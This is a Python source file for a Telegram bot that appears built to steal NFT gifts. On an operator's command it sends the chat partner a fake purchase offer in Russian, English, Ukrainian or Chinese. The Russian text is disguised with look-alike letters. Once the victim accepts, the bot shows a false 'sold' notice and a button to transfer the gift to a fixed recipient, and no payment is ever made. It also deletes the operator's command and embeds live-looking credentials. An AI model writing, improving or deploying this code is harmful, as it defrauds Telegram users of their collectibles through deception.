import asyncio
import random
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
from aiogram.enums import ParseMode
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramRetryAfter
from telethon import TelegramClient, events
from telethon.tl.custom import Button

TOKEN    = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
API_ID   = 34624108
API_HASH = "e8095d777dea9b5066a130eab3f7aa67"
RECIPIENT = "@recipient_username"

logging.basicConfig(level=logging.INFO)
bot     = Bot(token=TOKEN)
dp      = Dispatcher(storage=MemoryStorage())
userbot = TelegramClient("/app/userbot_session", API_ID, API_HASH)

message_queue  = asyncio.Queue()
client_user_ids = {}
# chat_id -> {msg_id, lang, slug, gift_num, currency_name}
_pending: dict[int, dict] = {}

LOCALES = {
    "ru": {
        "offer_text":   'Пoльзοватeль <b>cryptan</b> пρeдлагaет Bам <b>{amount} {currency_emoji}</b> зa кoллeкционный пpедмeт <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПpeдлοжeние дeйcтвyeт в тeчeнии 5 ч. 59 мин..',
        "btn_decline":  "Отклонить",
        "btn_accept":   "Принять",
        "btn_transfer": "Передать",
        "btn_confirm":  "Подтвердить передачу",
        "flood_error":  "⚠️ Временное ограничение (PEER_FLOOD). Попробуйте позже.",
        "accept_text":  "🎁 <b>Коллекционный предмет <a href=\"https://t.me/nft/{slug}-{gift_num}\">{slug} #{gift_num}</a> успешно продан!</b>\n\n• Передайте коллекционный предмет покупателю для зачисления {currency_name}.\n\u200B",
        "currency_stars": "Звёзд",
        "currency_gram":  "Gram",
        "declined":     "❌ Предложение отклонено.",
    },
    "eng": {
        "offer_text":   'User <b>cryptan</b> offers you <b>{amount} {currency_emoji}</b> for the collectible <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nOffer valid for 5 h. 59 min.',
        "btn_decline":  "Decline",
        "btn_accept":   "Accept",
        "btn_transfer": "Transfer",
        "btn_confirm":  "Confirm transfer",
        "flood_error":  "⚠️ Temporary limit. Please try later.",
        "accept_text":  "🎁 <b>Collectible <a href=\"https://t.me/nft/{slug}-{gift_num}\">{slug} #{gift_num}</a> successfully sold!</b>\n\n• Transfer the collectible to the buyer to receive {currency_name}.\n\u200B",
        "currency_stars": "Stars",
        "currency_gram":  "Gram",
        "declined":     "❌ Offer declined.",
    },
    "ukr": {
        "offer_text":   'Користувач <b>cryptan</b> пропонує Вам <b>{amount} {currency_emoji}</b> за колекційний предмет <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПропозиція діє 5 год. 59 хв.',
        "btn_decline":  "Відхилити",
        "btn_accept":   "Прийняти",
        "btn_transfer": "Передати",
        "btn_confirm":  "Підтвердити передачу",
        "flood_error":  "⚠️ Тимчасове обмеження. Спробуйте пізніше.",
        "accept_text":  "🎁 <b>Колекційний предмет <a href=\"https://t.me/nft/{slug}-{gift_num}\">{slug} #{gift_num}</a> успішно продано!</b>\n\n• Передайте покупцю для зарахування {currency_name}.\n\u200B",
        "currency_stars": "Зірок",
        "currency_gram":  "Gram",
        "declined":     "❌ Пропозицію відхилено.",
    },
    "cn": {
        "offer_text":   '用户 <b>cryptan</b> 向您出价 <b>{amount} {currency_emoji}</b> 购买收藏品 <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n有效期 5 小时 59 分钟。',
        "btn_decline":  "拒绝",
        "btn_accept":   "接受",
        "btn_transfer": "转移",
        "btn_confirm":  "确认转移",
        "flood_error":  "⚠️ 暂时限制。请稍后重试。",
        "accept_text":  "🎁 <b>收藏品 <a href=\"https://t.me/nft/{slug}-{gift_num}\">{slug} #{gift_num}</a> 已成功出售！</b>\n\n• 请将收藏品转移给买家以收取 {currency_name}。\n\u200B",
        "currency_stars": "星",
        "currency_gram":  "Gram",
        "declined":     "❌ 报价已被拒绝。",
    },
}


def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
    slug = gift_name.replace(" ", "")
    loc  = LOCALES.get(lang, LOCALES["ru"])
    if currency_type.lower() == "gram":
        currency_emoji = "💎"
    else:
        currency_emoji = "⭐️"
    return loc["offer_text"].format(
        amount=amount,
        currency_emoji=currency_emoji,
        slug=slug,
        gift_name=gift_name,
        gift_num=gift_num,
    )


def build_accept_text(slug, gift_num, currency_name, lang):
    loc = LOCALES.get(lang, LOCALES["ru"])
    return loc["accept_text"].format(
        slug=slug,
        gift_num=gift_num,
        currency_name=currency_name,
    )


def make_offer_buttons(slug, gift_num, amount, currency_type, lang):
    loc      = LOCALES.get(lang, LOCALES["ru"])
    cb_data  = f"a|{slug}|{gift_num}|{amount}|{currency_type}|{lang}"
    dec_data = f"d|{slug}|{gift_num}|{lang}"
    return [
        [
            Button.inline(loc["btn_decline"], dec_data.encode()),
            Button.inline(loc["btn_accept"],  cb_data.encode()),
        ]
    ]


def make_accept_buttons(slug, gift_num, lang):
    loc       = LOCALES.get(lang, LOCALES["ru"])
    recipient = RECIPIENT.lstrip("@")
    return [
        [Button.url(loc["btn_transfer"], f"tg://send_gift?to={recipient}")],
        [Button.inline(loc["btn_confirm"], b"noop")],
    ]


# ── aiogram: только команды оператора ──────────────────────────────────────

@dp.message(F.chat.type == "private")
async def handle_private(message: Message):
    await message.answer("Бот работает через Telegram Business.")


@dp.business_message(F.text)
async def handle_business_command(message: Message):
    if not message.text:
        return
    text_clean = message.text.strip()
    if not text_clean.lower().startswith("qq"):
        return

    chat_id = message.chat.id
    if message.from_user:
        client_user_ids[chat_id] = message.from_user.id

    parts = text_clean.split()
    if len(parts) < 3:
        return

    raw_nft_part = next((p for p in parts if "t.me/nft/" in p), None)
    if not raw_nft_part:
        return

    text_lower = text_clean.lower()
    currency_type = "gram" if "gram" in text_lower else "stars"

    amount = 1000
    for p in parts:
        if p.isdigit():
            amount = int(p)
            break

    lang = "ru"
    for l in ["ukr", "eng", "cn", "ru"]:
        if l in parts or l in text_lower.split():
            lang = l
            break

    try:
        clean_url    = raw_nft_part.split("?")[0].rstrip("/")
        slug_part    = clean_url.split("/nft/")[-1]
        gift_name_raw, gift_num_str = slug_part.rsplit("-", 1)
        gift_num  = int(gift_num_str)
        gift_name = gift_name_raw.replace("-", " ")
    except Exception as e:
        logging.error(f"Parse error: {e}")
        return

    await message_queue.put({
        "chat_id":      chat_id,
        "gift_name":    gift_name,
        "gift_num":     gift_num,
        "amount":       amount,
        "currency_type": currency_type,
        "lang":         lang,
        "bcid":         message.business_connection_id,
        "cmd_message_id": message.message_id,
    })


# ── Telethon: обработка кнопок ─────────────────────────────────────────────

@userbot.on(events.CallbackQuery())
async def userbot_callback(event):
    data = event.data.decode("utf-8")

    if data.startswith("a|"):
        parts = data.split("|")
        if len(parts) < 6:
            await event.answer("Ошибка данных", alert=True)
            return

        _, slug, gift_num_str, amount, currency_type, lang = parts
        gift_num = int(gift_num_str)

        loc           = LOCALES.get(lang, LOCALES["ru"])
        currency_name = loc["currency_gram"] if currency_type.lower() == "gram" else loc["currency_stars"]
        text          = build_accept_text(slug, gift_num, currency_name, lang)
        buttons       = make_accept_buttons(slug, gift_num, lang)

        await event.answer("✅ Успешно принято!", alert=True)
        await event.edit(text, buttons=buttons, parse_mode="html", link_preview=False)

    elif data.startswith("d|"):
        parts = data.split("|")
        lang  = parts[3] if len(parts) > 3 else "ru"
        loc   = LOCALES.get(lang, LOCALES["ru"])
        await event.answer(loc["declined"], alert=False)
        await event.delete()

    elif data == "noop":
        await event.answer("Сначала выполните передачу НФТ по кнопке выше!", alert=True)


# ── Sender worker ──────────────────────────────────────────────────────────

async def sender_worker():
    while True:
        task = await message_queue.get()
        try:
            await asyncio.sleep(random.uniform(0.5, 1.0))

            slug    = task["gift_name"].replace(" ", "")
            text    = build_offer_text(
                task["gift_name"], task["gift_num"],
                task["amount"], task["currency_type"], task["lang"]
            )
            buttons = make_offer_buttons(
                slug, task["gift_num"],
                task["amount"], task["currency_type"], task["lang"]
            )

            await userbot.send_message(
                entity=task["chat_id"],
                message=text,
                buttons=buttons,
                link_preview=False,
                parse_mode="html",
            )

            if task["bcid"]:
                await bot.delete_business_messages(
                    business_connection_id=task["bcid"],
                    message_ids=[task["cmd_message_id"]]
                )

        except Exception as e:
            error_str = str(e)
            if "PEER_FLOOD" in error_str:
                logging.warning(f"PEER_FLOOD in chat {task['chat_id']}")
                target_user_id = client_user_ids.get(task["chat_id"])
                loc = LOCALES.get(task["lang"], LOCALES["ru"])
                if target_user_id:
                    try:
                        await bot.send_message(chat_id=target_user_id, text=loc["flood_error"])
                    except Exception:
                        pass
            else:
                logging.error(f"Worker error: {error_str}")
        finally:
            message_queue.task_done()


# ── Main ───────────────────────────────────────────────────────────────────

async def main():
    await userbot.start()
    print("Userbot started")

    asyncio.create_task(sender_worker())

    await dp.start_polling(
        bot,
        allowed_updates=["callback_query", "business_connection", "business_message", "message"]
    )


if __name__ == "__main__":
    asyncio.run(main())
